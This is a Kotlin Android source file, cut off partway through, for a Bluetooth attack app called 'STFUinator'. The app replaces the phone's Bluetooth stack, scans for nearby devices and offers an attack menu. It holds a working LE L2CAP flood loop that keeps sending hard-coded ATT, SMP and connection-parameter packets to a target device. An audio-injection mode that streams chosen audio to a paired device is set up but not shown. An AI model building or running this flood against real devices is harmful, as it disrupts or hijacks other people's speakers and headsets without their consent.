package com.stfuinator

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.OpenableColumns
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Pause
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Slider
import androidx.compose.material3.SliderDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.content.ContextCompat
import com.courierstack.a2dp.avdtp.AudioStreamer
import com.courierstack.a2dp.avdtp.AvdtpConstants
import com.courierstack.a2dp.avdtp.AvdtpManager
import com.courierstack.a2dp.avdtp.IAvdtpListener
import com.courierstack.a2dp.avdtp.StreamEndpoint
import com.courierstack.a2dp.codec.SbcCodec
import com.courierstack.util.CourierLogger
import com.courierstack.core.CourierStackManager
import com.courierstack.gatt.GattCharacteristic
import com.courierstack.gatt.GattDescriptor
import com.courierstack.gatt.GattManager
import com.courierstack.gatt.GattService
import com.courierstack.gatt.IGattListener
import com.courierstack.hci.HciCommands
import com.courierstack.l2cap.AclConnection
import com.courierstack.l2cap.ConnectionType
import com.courierstack.l2cap.IL2capConnectionCallback
import com.courierstack.l2cap.IL2capListener
import com.courierstack.l2cap.L2capChannel
import com.courierstack.l2cap.L2capManager
import com.courierstack.security.bredr.BondingInfo
import com.courierstack.security.bredr.IBrEdrPairingListener
import com.courierstack.security.bredr.BrEdrPairingManager
import com.courierstack.security.bredr.BrEdrPairingMode
import com.courierstack.gap.IDiscoveryListener
import com.courierstack.gap.DiscoveredDevice
import com.courierstack.gap.DeviceDiscovery
import com.courierstack.sdp.SdpManager
import com.courierstack.security.le.ISmpListener
import com.courierstack.security.le.SmpConstants
import com.courierstack.security.le.SmpManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.io.PrintWriter
import java.io.StringWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import com.courierstack.security.le.BondingInfo as SmpBondingInfo


val NeonGreen = Color(0xFF39FF14)
val SurfaceGreen = Color(0xFF1A2F1A)
val CardBackground = Color(0xFF0A1F0A)
val NeonRed = Color(0xFFFF3131)
val NeonOrange = Color(0xFFFF8C00)
val NeonBlue = Color(0xFF00BFFF)

val GreenGradient = Brush.verticalGradient(
    colors = listOf(Color(0xFF0A0F0A), Color(0xFF0D1A0D), Color(0xFF0A0F0A))
)


object FileLogger {
    private const val TAG = "STFUinator"
    private const val LOG_FILE_NAME = "stfuinator_debug.log"
    private const val MAX_LOG_SIZE = 10 * 1024 * 1024

    private var logFile: File? = null
    private var fileWriter: FileWriter? = null
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US)
    private val lock = Any()
    private var isInitialized = false
    private var sessionId: String = ""

    enum class Level(val prefix: String, val androidLevel: Int) {
        DEBUG("D", Log.DEBUG),
        INFO("I", Log.INFO),
        WARN("W", Log.WARN),
        ERROR("E", Log.ERROR)
    }

    fun init(context: Context) {
        synchronized(lock) {
            if (isInitialized) return
            try {
                sessionId = UUID.randomUUID().toString().substring(0, 8)
                val logDir = context.getExternalFilesDir(null) ?: context.filesDir
                logFile = File(logDir, LOG_FILE_NAME)

                if (logFile!!.exists() && logFile!!.length() > MAX_LOG_SIZE) {
                    val backupFile = File(logDir, "${LOG_FILE_NAME}.old")
                    backupFile.delete()
                    logFile!!.renameTo(backupFile)
                    logFile = File(logDir, LOG_FILE_NAME)
                }

                fileWriter = FileWriter(logFile, true)
                isInitialized = true

                writeRaw("\n${"=".repeat(80)}\n")
                writeRaw("NEW SESSION: ${dateFormat.format(Date())} | ID: $sessionId\n")
                writeRaw("Device: ${Build.MANUFACTURER} ${Build.MODEL} | Android ${Build.VERSION.RELEASE}\n")
                writeRaw("${"=".repeat(80)}\n\n")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to init FileLogger", e)
            }
        }
    }

    private fun writeRaw(text: String) {
        try {
            fileWriter?.write(text)
            fileWriter?.flush()
        } catch (_: Exception) { }
    }

    private fun log(level: Level, tag: String, message: String, throwable: Throwable? = null) {
        val timestamp = dateFormat.format(Date())
        val logLine = "[$timestamp] [${level.prefix}/$tag] $message"
        Log.println(level.androidLevel, tag, message)
        throwable?.let { Log.println(level.androidLevel, tag, Log.getStackTraceString(it)) }
        synchronized(lock) {
            if (isInitialized) {
                writeRaw("$logLine\n")
                throwable?.let {
                    val sw = StringWriter()
                    it.printStackTrace(PrintWriter(sw))
                    writeRaw(sw.toString())
                }
            }
        }
    }

    fun d(tag: String, message: String) = log(Level.DEBUG, tag, message)
    fun i(tag: String, message: String) = log(Level.INFO, tag, message)
    fun w(tag: String, message: String) = log(Level.WARN, tag, message)
    fun e(tag: String, message: String, t: Throwable? = null) = log(Level.ERROR, tag, message, t)
    fun logSeparator(tag: String, title: String) = log(Level.INFO, tag, "===== $title =====")

    fun close() {
        synchronized(lock) {
            try {
                fileWriter?.close()
            } catch (_: Exception) { }
            isInitialized = false
        }
    }
}


enum class AttackMethod(val title: String, val description: String, val color: Long) {
    METHOD_1("LE L2CAP Flood", "BLE ATT/SMP/L2CAP packet flood via HCI", 0xFFFF3131),
    METHOD_5("Audio Inject", "Stream custom audio to paired device", 0xFF4CAF50),
}

data class AttackStats(
    val connections: Int = 0,
    val dataSent: Long = 0,
    val failures: Int = 0,
    val elapsed: Int = 0
)


class MainActivity : ComponentActivity() {
    private val TAG = "MainActivity"


    private var courierStack: CourierStackManager? = null
    private var l2capManager: L2capManager? = null
    private var scannerManager: DeviceDiscovery? = null
    private var pairingManager: BrEdrPairingManager? = null
    private var smpManager: SmpManager? = null
    private var gattManager: GattManager? = null
    private var avdtpManager: AvdtpManager? = null
    private var sbcCodec: SbcCodec? = null
    private var sdpManager: SdpManager? = null


    private var stackInitState by mutableStateOf(CourierStackManager.State.UNINITIALIZED)
    private var stackStatusMessages = mutableStateListOf<String>()
    private var stackInitialized by mutableStateOf(false)


    private val scannedDevices = mutableStateMapOf<String, DiscoveredDevice>()
    private var isScanning by mutableStateOf(false)
    private var hasPermissions by mutableStateOf(false)


    private var isAttacking by mutableStateOf(false)
    private var attackPaused by mutableStateOf(false)
    private var attackTarget by mutableStateOf<DiscoveredDevice?>(null)
    private var attackMethod by mutableStateOf<AttackMethod?>(null)
    private var attackStats by mutableStateOf(AttackStats())
    private var attackJob: Job? = null
    private val attackRunning = AtomicBoolean(false)
    private val attackPausedFlag = AtomicBoolean(false)


    private var selectedAudioUri by mutableStateOf<Uri?>(null)
    private var selectedAudioName by mutableStateOf<String?>(null)
    private var audioBytes: ByteArray? = null
    private var pendingAudioAttackDevice: DiscoveredDevice? = null
    private var audioVolumeGain by mutableStateOf(2.0f)


    private var showVolumeDialog by mutableStateOf(false)


    private val audioPickerLauncher = registerForActivityResult(
        ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        uri?.let { selectedUri ->
            selectedAudioUri = selectedUri
            selectedAudioName = getFileName(selectedUri)
            loadAudioFile(selectedUri)
            showVolumeDialog = true
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasPermissions = permissions.values.all { it }
        FileLogger.i(TAG, "Permissions granted: $hasPermissions")
    }


    private val l2capListener = object : IL2capListener {
        override fun onConnectionComplete(connection: AclConnection) {
            FileLogger.i(TAG, "ACL connection complete: ${connection.getFormattedAddress()}, handle=0x${Integer.toHexString(connection.handle)}")
        }

        override fun onDisconnectionComplete(handle: Int, reason: Int) {
            FileLogger.i(TAG, "ACL disconnection: handle=0x${Integer.toHexString(handle)}, reason=0x${Integer.toHexString(reason)}")
        }

        override fun onChannelOpened(channel: L2capChannel) {
            FileLogger.i(TAG, "L2CAP channel opened: localCid=0x${Integer.toHexString(channel.localCid)}, PSM=${channel.psm}")
        }

        override fun onChannelClosed(channel: L2capChannel) {
            FileLogger.i(TAG, "L2CAP channel closed: localCid=0x${Integer.toHexString(channel.localCid)}")
        }

        override fun onDataReceived(channel: L2capChannel, data: ByteArray) {
            FileLogger.d(TAG, "L2CAP data received: ${data.size} bytes on CID 0x${Integer.toHexString(channel.localCid)}")
        }

        override fun onConnectionRequest(handle: Int, psm: Int, sourceCid: Int) {
            FileLogger.i(TAG, "L2CAP connection request: handle=0x${Integer.toHexString(handle)}, PSM=$psm")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "L2CAP error: $message")
        }

        override fun onMessage(message: String) {
            FileLogger.d(TAG, "L2CAP: $message")
        }
    }


    private val scanListener = object : IDiscoveryListener {
        override fun onDeviceFound(device: DiscoveredDevice) {

            val modeInfo = when {
                device.isDualMode() -> "LE+BR/EDR (Dual-Mode)"
                device.supportsBrEdr() -> "LE (BR/EDR capable)"
                device.addressType == 0 -> "LE (Public addr)"
                else -> "LE (Random addr)"
            }
            FileLogger.d(TAG, "Device found: ${device.address} (${device.name}) RSSI=${device.rssi} [$modeInfo]")
            runOnUiThread {
                scannedDevices[device.address] = device
            }
        }

        override fun onScanStateChanged(scanning: Boolean) {
            FileLogger.i(TAG, "Scan state changed: scanning=$scanning")
            runOnUiThread { isScanning = scanning }
        }

        override fun onScanComplete() {
            FileLogger.i(TAG, "LE scan complete")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "Scan error: $message")
        }
    }


    private val pairingListener = object : IBrEdrPairingListener {
        override fun onPairingStarted(handle: Int, address: ByteArray) {
            FileLogger.i(TAG, "Pairing started: ${formatAddress(address)}")
        }

        override fun onIoCapabilityRequest(handle: Int, address: ByteArray) {
            FileLogger.i(TAG, "IO Capability request from ${formatAddress(address)}")
        }

        override fun onNumericComparison(handle: Int, address: ByteArray, value: Int) {
            FileLogger.i(TAG, "Numeric comparison: $value for ${formatAddress(address)}")
        }

        override fun onPasskeyRequest(handle: Int, address: ByteArray, display: Boolean, passkey: Int) {
            FileLogger.i(TAG, "Passkey request: display=$display, passkey=$passkey")
        }

        override fun onPairingComplete(handle: Int, address: ByteArray, success: Boolean, info: BondingInfo?) {
            FileLogger.i(TAG, "Pairing complete: success=$success for ${formatAddress(address)}")
        }

        override fun onPairingFailed(handle: Int, address: ByteArray, errorCode: Int, reason: String) {
            FileLogger.e(TAG, "Pairing failed: $reason (error=$errorCode)")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "Pairing error: $message")
        }

        override fun onMessage(message: String) {
            FileLogger.d(TAG, "Pairing: $message")
        }
    }


    private val smpListener = object : ISmpListener {
        override fun onPairingStarted(handle: Int, address: ByteArray) {
            FileLogger.i(TAG, "SMP pairing started: ${formatAddress(address)}")
        }

        override fun onPairingRequest(handle: Int, address: ByteArray, ioCap: Int, authReq: Int, secureConnections: Boolean) {
            FileLogger.i(TAG, "SMP pairing request from ${formatAddress(address)}, SC=$secureConnections")
        }

        override fun onPairingComplete(handle: Int, address: ByteArray, success: Boolean, info: SmpBondingInfo?) {
            FileLogger.i(TAG, "SMP pairing complete: success=$success for ${formatAddress(address)}")
        }

        override fun onPairingFailed(handle: Int, address: ByteArray, errorCode: Int, reason: String) {
            FileLogger.e(TAG, "SMP pairing failed: $reason (error=$errorCode) for ${formatAddress(address)}")
        }

        override fun onPasskeyRequired(handle: Int, address: ByteArray, display: Boolean, passkey: Int) {
            FileLogger.i(TAG, "SMP passkey required: display=$display, passkey=$passkey")
        }

        override fun onNumericComparisonRequired(handle: Int, address: ByteArray, numericValue: Int) {
            FileLogger.i(TAG, "SMP numeric comparison: $numericValue")
        }

        override fun onEncryptionChanged(handle: Int, encrypted: Boolean) {
            FileLogger.i(TAG, "SMP encryption changed: encrypted=$encrypted")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "SMP error: $message")
        }

        override fun onMessage(message: String) {
            FileLogger.d(TAG, "SMP: $message")
        }
    }


    private val sdpListener = object : SdpManager.ISdpListener {
        override fun onMessage(message: String) {
            FileLogger.d(TAG, "SDP: $message")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "SDP Error: $message")
        }
    }


    private val gattListener = object : IGattListener {
        override fun onConnectionStateChanged(connectionHandle: Int, connected: Boolean) {
            FileLogger.i(TAG, "GATT connection state: handle=0x${Integer.toHexString(connectionHandle)}, connected=$connected")
        }

        override fun onServicesDiscovered(connectionHandle: Int, services: Array<GattService>) {
            FileLogger.i(TAG, "GATT services discovered: ${services.size} services")
        }

        override fun onCharacteristicRead(connectionHandle: Int, characteristic: GattCharacteristic, value: ByteArray?, status: Int) {
            FileLogger.d(TAG, "GATT characteristic read: status=$status")
        }

        override fun onCharacteristicWrite(connectionHandle: Int, characteristic: GattCharacteristic, status: Int) {
            FileLogger.d(TAG, "GATT characteristic write: status=$status")
        }

        override fun onNotification(connectionHandle: Int, characteristic: GattCharacteristic, value: ByteArray) {
            FileLogger.d(TAG, "GATT notification: ${value.size} bytes")
        }

        override fun onIndication(connectionHandle: Int, characteristic: GattCharacteristic, value: ByteArray) {
            FileLogger.d(TAG, "GATT indication: ${value.size} bytes")
        }

        override fun onDescriptorRead(connectionHandle: Int, descriptor: GattDescriptor, value: ByteArray?, status: Int) {
            FileLogger.d(TAG, "GATT descriptor read: status=$status")
        }

        override fun onDescriptorWrite(connectionHandle: Int, descriptor: GattDescriptor, status: Int) {
            FileLogger.d(TAG, "GATT descriptor write: status=$status")
        }

        override fun onMtuChanged(connectionHandle: Int, mtu: Int) {
            FileLogger.i(TAG, "GATT MTU changed: mtu=$mtu")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "GATT error: $message")
        }

        override fun onMessage(message: String) {
            FileLogger.d(TAG, "GATT: $message")
        }
    }


    private val avdtpListener = object : IAvdtpListener {
        override fun onConnected(handle: Int, address: ByteArray) {
            FileLogger.i(TAG, "AVDTP connected: ${formatAddress(address)}")
        }

        override fun onDisconnected(handle: Int, reason: Int) {
            FileLogger.i(TAG, "AVDTP disconnected: handle=0x${Integer.toHexString(handle)}, reason=0x${Integer.toHexString(reason)}")
        }

        override fun onEndpointsDiscovered(handle: Int, endpoints: List<StreamEndpoint>) {
            FileLogger.i(TAG, "AVDTP endpoints discovered: ${endpoints.size}")
        }

        override fun onStreamConfigured(localSeid: Int, remoteSeid: Int) {
            FileLogger.i(TAG, "AVDTP stream configured: local=$localSeid, remote=$remoteSeid")
        }

        override fun onStreamOpened(localSeid: Int) {
            FileLogger.i(TAG, "AVDTP stream opened: seid=$localSeid")
        }

        override fun onStreamStarted(handle: Int) {
            FileLogger.i(TAG, "AVDTP stream started")
        }

        override fun onStreamSuspended(handle: Int) {
            FileLogger.i(TAG, "AVDTP stream suspended")
        }

        override fun onStreamClosed(handle: Int) {
            FileLogger.i(TAG, "AVDTP stream closed")
        }

        override fun onMediaReceived(handle: Int, data: ByteArray, timestamp: Int) {
            FileLogger.d(TAG, "AVDTP media received: ${data.size} bytes")
        }

        override fun onError(message: String) {
            FileLogger.e(TAG, "AVDTP error: $message")
        }

        override fun onMessage(message: String) {
            FileLogger.d(TAG, "AVDTP: $message")
        }
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        FileLogger.init(this)
        FileLogger.logSeparator(TAG, "onCreate")


        CourierLogger.init(this)

        checkPermissions()

        setContent {
            STFUinatorTheme {
                STFUinatorApp(
                    initState = stackInitState,
                    statusMessages = stackStatusMessages,
                    stackInitialized = stackInitialized,
                    scannedDevices = scannedDevices.values.toList(),
                    isScanning = isScanning,
                    hasPermissions = hasPermissions,
                    isAttacking = isAttacking,
                    attackPaused = attackPaused,
                    attackTarget = attackTarget,
                    attackMethod = attackMethod,
                    attackStats = attackStats,
                    selectedAudioName = selectedAudioName,
                    showVolumeDialog = showVolumeDialog,
                    audioVolumeGain = audioVolumeGain,
                    onInitStack = { initializeCourierStack() },
                    onRequestPermissions = { requestPermissions() },
                    onStartScan = { startScan() },
                    onStopScan = { stopScan() },
                    onDeviceClick = { device, method ->
                        if (method == AttackMethod.METHOD_5) {
                            pickAudioFile(device)
                        } else {
                            startAttack(device, method)
                        }
                    },
                    onPauseAttack = { pauseAttack() },
                    onResumeAttack = { resumeAttack() },
                    onStopAttack = { stopAttack() },
                    onDismissVolumeDialog = { showVolumeDialog = false },
                    onConfirmVolumeDialog = { gain ->
                        audioVolumeGain = gain
                        showVolumeDialog = false
                        pendingAudioAttackDevice?.let { launchAudioAttack(it) }
                    }
                )
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        FileLogger.logSeparator(TAG, "onDestroy")
        shutdownStack()
        FileLogger.close()
    }


    private fun initializeCourierStack() {
        if (stackInitialized) return

        stackStatusMessages.clear()
        stackInitState = CourierStackManager.State.INITIALIZING
        stackStatusMessages.add("Initializing CourierStack...")

        CoroutineScope(Dispatchers.IO).launch {
            try {

                courierStack = CourierStackManager.getInstance()

                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Killing Android Bluetooth stack...")
                }


                courierStack?.initializeWithHalKill(this@MainActivity) { success, error ->
                    runOnUiThread {
                        if (success) {
                            stackStatusMessages.add("HAL initialized successfully")
                            initializeManagers()
                        } else {
                            stackStatusMessages.add("HAL initialization failed: $error")
                            stackInitState = CourierStackManager.State.ERROR
                        }
                    }
                }
            } catch (e: Exception) {
                FileLogger.e(TAG, "Stack initialization failed", e)
                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Error: ${e.message}")
                    stackInitState = CourierStackManager.State.ERROR
                }
            }
        }
    }

    private fun initializeManagers() {
        CoroutineScope(Dispatchers.IO).launch {
            try {

                val hciManager = courierStack?.hciManager
                if (hciManager == null || !hciManager.isInitialized) {
                    throw Exception("CourierStack HCI manager not available")
                }

                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Using CourierStack HCI layer...")
                }


                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing L2CAP layer...")
                }
                l2capManager = L2capManager(this@MainActivity, l2capListener, hciManager)
                if (!l2capManager!!.initialize()) {
                    throw Exception("L2CAP initialization failed")
                }


                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing scanner...")
                }
                scannerManager = DeviceDiscovery(l2capManager!!.hciManager)
                scannerManager!!.addListener(scanListener)


                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing pairing manager...")
                }
                pairingManager = BrEdrPairingManager(l2capManager!!, pairingListener)
                pairingManager!!.initialize()


                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing SMP manager...")
                }
                smpManager = SmpManager(l2capManager!!, smpListener)
                smpManager!!.initialize()


                courierStack?.getLocalAddress()?.let { localAddr ->
                    smpManager!!.setLocalAddress(localAddr, 0)
                    FileLogger.d(TAG, "SMP: Local address set to ${formatAddress(localAddr)}")
                }


                pairingManager!!.setSmpManager(smpManager!!)


                pairingManager!!.setForceLegacyPairing(true)


                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing GATT manager...")
                }
                gattManager = GattManager(l2capManager!!, gattListener)
                gattManager!!.initialize()


                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing AVDTP manager...")
                }
                avdtpManager = AvdtpManager(l2capManager!!, avdtpListener)
                avdtpManager!!.initialize()




                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Initializing SDP manager...")
                }
                sdpManager = SdpManager(l2capManager!!, sdpListener)
                sdpManager!!.initialize()
                sdpManager!!.startServer()
                FileLogger.i(TAG, "SDP server started - BR/EDR pairing enabled")



                sbcCodec = SbcCodec()

                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("All managers initialized!")
                    stackStatusMessages.add("CourierStack ready!")
                    stackInitState = CourierStackManager.State.READY
                    stackInitialized = true
                }

                FileLogger.i(TAG, "CourierStack fully initialized")
            } catch (e: Exception) {
                FileLogger.e(TAG, "Manager initialization failed", e)
                withContext(Dispatchers.Main) {
                    stackStatusMessages.add("Error: ${e.message}")
                    stackInitState = CourierStackManager.State.ERROR
                }
            }
        }
    }

    private fun shutdownStack() {
        try {
            sdpManager?.shutdown()
            avdtpManager?.shutdown()
            gattManager?.shutdown()
            smpManager?.close()
            pairingManager?.close()
            l2capManager?.close()
            courierStack?.shutdownAndRestore(null)
        } catch (e: Exception) {
            FileLogger.e(TAG, "Error during shutdown", e)
        }
    }


    private fun checkPermissions() {
        hasPermissions = getRequiredPermissions().all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun getRequiredPermissions(): List<String> {
        val permissions = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            permissions.add(Manifest.permission.BLUETOOTH_SCAN)
            permissions.add(Manifest.permission.BLUETOOTH_CONNECT)
            permissions.add(Manifest.permission.BLUETOOTH_ADVERTISE)
        }
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        return permissions
    }

    private fun requestPermissions() {
        permissionLauncher.launch(getRequiredPermissions().toTypedArray())
    }


    private fun startScan() {
        if (!hasPermissions) {
            FileLogger.w(TAG, "Cannot start scan - no permissions")
            return
        }

        if (!stackInitialized || scannerManager == null) {
            FileLogger.w(TAG, "Cannot start scan - stack not initialized")
            return
        }

        scannedDevices.clear()
        FileLogger.i(TAG, "Starting LE scan...")
        scannerManager?.startLeScan()
        isScanning = true
    }

    private fun stopScan() {
        scannerManager?.stopAllScans()
        isScanning = false
        FileLogger.i(TAG, "LE scan stopped")
    }


    private fun startAttack(device: DiscoveredDevice, method: AttackMethod) {
        if (isAttacking) return

        stopScan()

        attackTarget = device
        attackMethod = method
        attackStats = AttackStats()
        isAttacking = true
        attackPaused = false
        attackRunning.set(true)
        attackPausedFlag.set(false)

        attackJob = CoroutineScope(Dispatchers.IO).launch {
            when (method) {
                AttackMethod.METHOD_1 -> executeL2capFlood(device)
                AttackMethod.METHOD_5 -> executeAudioInject(device)
            }

            withContext(Dispatchers.Main) {
                isAttacking = false
                attackTarget = null
                attackMethod = null
            }
        }
    }

    private fun pauseAttack() {
        attackPaused = true
        attackPausedFlag.set(true)
    }

    private fun resumeAttack() {
        attackPaused = false
        attackPausedFlag.set(false)
    }

    private fun stopAttack() {
        attackRunning.set(false)
        attackPausedFlag.set(false)
        attackJob?.cancel()
        attackJob = null
        isAttacking = false
        attackPaused = false
        attackTarget = null
        attackMethod = null
    }


    private suspend fun executeL2capFlood(device: DiscoveredDevice) {
        val l2cap = l2capManager ?: return

        FileLogger.i(TAG, "Starting LE L2CAP flood attack on ${device.address}")
        FileLogger.i(TAG, "Device info: addressType=${device.addressType}, isDualMode=${device.isDualMode()}, supportsBrEdr=${device.supportsBrEdr()}")

        val address = parseAddress(device.address)
        val packetsSent = AtomicInteger(0)
        val channelsFlooded = AtomicInteger(0)
        val failures = AtomicInteger(0)
        val startTime = System.currentTimeMillis()


        val connectionLatch = java.util.concurrent.CountDownLatch(1)
        var connectionHandle: Int? = null
        var isConnected = true

        val listener = object : IL2capListener {
            override fun onConnectionComplete(connection: AclConnection) {
                if (connection.matchesAddress(address)) {
                    connectionHandle = connection.handle
                    connectionLatch.countDown()
                    FileLogger.i(TAG, "LE ACL connected, handle=0x${Integer.toHexString(connection.handle)}")
                }
            }
            override fun onDisconnectionComplete(handle: Int, reason: Int) {
                FileLogger.i(TAG, "LE disconnected, reason=0x${Integer.toHexString(reason)}")
                isConnected = false
            }
            override fun onChannelOpened(channel: L2capChannel) {}
            override fun onChannelClosed(channel: L2capChannel) {}
            override fun onDataReceived(channel: L2capChannel, data: ByteArray) {}
            override fun onConnectionRequest(handle: Int, psm: Int, sourceCid: Int) {}
            override fun onError(message: String) {
                FileLogger.e(TAG, "L2CAP error: $message")
                failures.incrementAndGet()
            }
            override fun onMessage(message: String) {}
        }

        l2cap.addListener(listener)


        FileLogger.i(TAG, "Creating LE connection (addressType=${device.addressType})...")
        l2cap.createLeConnection(address, device.addressType, IL2capConnectionCallback.create(
            { _ -> },
            { reason ->
                FileLogger.e(TAG, "LE connection failed, reason=$reason")
                failures.incrementAndGet()
                connectionLatch.countDown()
            }
        ))

        val connected = connectionLatch.await(15, java.util.concurrent.TimeUnit.SECONDS)

        if (!connected || connectionHandle == null) {
            FileLogger.e(TAG, "Failed to establish LE ACL connection")
            l2cap.removeListener(listener)
            withContext(Dispatchers.Main) { attackStats = attackStats.copy(failures = failures.get()) }
            return
        }

        val handle = connectionHandle!!
        withContext(Dispatchers.Main) { attackStats = attackStats.copy(connections = 1) }

        FileLogger.i(TAG, "LE connection established! Starting flood on fixed channels...")


        val CID_ATT = 0x0004
        val CID_LE_SIGNALING = 0x0005
        val CID_SMP = 0x0006


        val attExchangeMtu = byteArrayOf(0x02, 0xF7.toByte(), 0x00)
        val attFindInfo = byteArrayOf(0x04, 0x01, 0x00, 0xFF.toByte(), 0xFF.toByte())
        val attFindByType = byteArrayOf(0x06, 0x01, 0x00, 0xFF.toByte(), 0xFF.toByte(), 0x00, 0x28)
        val attReadByType = byteArrayOf(0x08, 0x01, 0x00, 0xFF.toByte(), 0xFF.toByte(), 0x00, 0x28)
        val attReadByGroup = byteArrayOf(0x10, 0x01, 0x00, 0xFF.toByte(), 0xFF.toByte(), 0x00, 0x28)
        val attRead = byteArrayOf(0x0A, 0x01, 0x00)
        val attWriteCmd = byteArrayOf(0x52, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)


        val smpPairingReq = byteArrayOf(0x01, 0x04, 0x00, 0x01, 0x10, 0x07, 0x07)
        val smpSecurityReq = byteArrayOf(0x0B, 0x05)


        fun buildConnParamUpdate(identifier: Int): ByteArray = byteArrayOf(
            0x12,
            identifier.toByte(),
            0x08, 0x00,
            0x06, 0x00,
            0x06, 0x00,
            0x00, 0x00,
            0xC8.toByte(), 0x00
        )

        try {
            var iteration = 0
            var signalId = 1

            while (attackRunning.get() && isConnected) {
                while (attackPausedFlag.get() && attackRunning.get()) { delay(100) }
                if (!attackRunning.get() || !isConnected) break


                try {
                    l2cap.sendFixedChannelData(handle, CID_ATT, attExchangeMtu)
                    l2cap.sendFixedChannelData(handle, CID_ATT, attFindInfo)
                    l2cap.sendFixedChannelData(handle, CID_ATT, attFindByType)
                    l2cap.sendFixedChannelData(handle, CID_ATT, attReadByType)
                    l2cap.sendFixedChannelData(handle, CID_ATT, attReadByGroup)
                    l2cap.sendFixedChannelData(handle, CID_ATT, attRead)

                    repeat(5) {
                        l2cap.sendFixedChannelData(handle, CID_ATT, attWriteCmd)
                    }
                    packetsSent.addAndGet(11)
                } catch (_: Exception) {
                    failures.incrementAndGet()
                }


                try {
                    l2cap.sendFixedChannelData(handle, CID_SMP, smpPairingReq)
                    l2cap.sendFixedChannelData(handle, CID_SMP, smpSecurityReq)
                    packetsSent.addAndGet(2)
                } catch (_: Exception) {
                    failures.incrementAndGet()
                }


                try {
                    l2cap.sendFixedChannelData(handle, CID_LE_SIGNALING, buildConnParamUpdate(signalId))
                    signalId = (signalId % 255) + 1
                    packetsSent.incrementAndGet()
                } catch (_: Exception) {
                    failures.incrementAndGet()
                }

                channelsFlooded.addAndGet(3)


                if (iteration % 50 == 0) {
                    val elapsed = (System.currentTimeMillis() - startTime) / 1000
                    val pps = if (elapsed > 0) packetsSent.get() / elapsed else 0
                    withContext(Dispatchers.Main) {
                        attackStats = AttackStats(
                            connections = channelsFlooded.get(),
                            dataSent = packetsSent.get().toLong() * 10,
                            failures = failures.get(),
                            elapsed = elapsed.toInt()
                        )
                    }
                    if (iteration % 500 == 0) {
